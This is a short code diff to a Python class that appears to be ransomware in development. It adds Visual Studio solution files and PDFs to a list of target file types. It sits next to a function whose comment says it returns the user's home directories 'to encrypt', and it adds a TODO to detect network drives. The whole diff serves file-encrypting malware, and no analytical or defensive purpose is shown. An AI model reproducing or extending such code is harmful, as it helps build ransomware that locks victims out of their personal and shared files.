@@ -23,6 +23,7 @@ class Base():
     # TODO Place base dirs in here. Create a function we can call to return them
     FILETYPES = [
                 # GENERAL FORMATS
+                "sln",
 
                 # IMAGE FORMATS
                 "jpg", "png",
@@ -31,7 +32,7 @@ class Base():
                 "mp4", "avi", "mkv",
 
                 # DOCUMENT FORMATS
-                "doc", "docx", "txt",
+                "doc", "docx", "txt", "pdf",
 
                 # SOUND FORMATS
                 "mp3",
@@ -45,6 +46,7 @@ class Base():
 
     def get_base_dirs(self, home_dir):
       # Function to return a list of base directories to encrypt
+      # TODO Detect presence of network drives
 
       base_dirs = [
                     os.path.join(home_dir, "Desktop"),
